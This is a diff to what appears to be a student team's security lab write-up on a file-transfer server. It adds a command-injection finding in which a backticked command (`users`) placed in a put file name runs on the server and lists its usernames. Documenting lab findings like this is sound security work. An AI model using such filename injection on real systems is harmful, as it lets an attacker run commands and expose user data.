@@ -1,4 +1,4 @@
-##Team1
+## Team1
 
 ### Buffer overflow
 
@@ -23,7 +23,31 @@ Segmentation fault (core dumped)
 mc08 56 $ 
 
 ```
+### Command injection
 
+* The put comand creates a file by using the '>' operator. We can thus inject commands in the filename
+
+Getting back a list of all usernames on the server:
+```
+mc08 124 $ ./client 127.0.0.1 31337
+[i] Connecting to 127.0.0.1:31337
+login n
+pass 1
+ls
+total 0
+put `users` 4
+open(): No such file or directory
+put port: 64049
+Attempting to transfer file before put call
+mc08 125 $ ./client 127.0.0.1 31337
+[i] Connecting to 127.0.0.1:31337
+login n
+pass 1
+ls
+total 0
+-rw-r----- 1 njaganna njaganna 0 Mar 18 12:00 achiraya chou63 chou63 njaganna njaganna wei253 wu1220
+
+```
 
 ### Design bugs
 
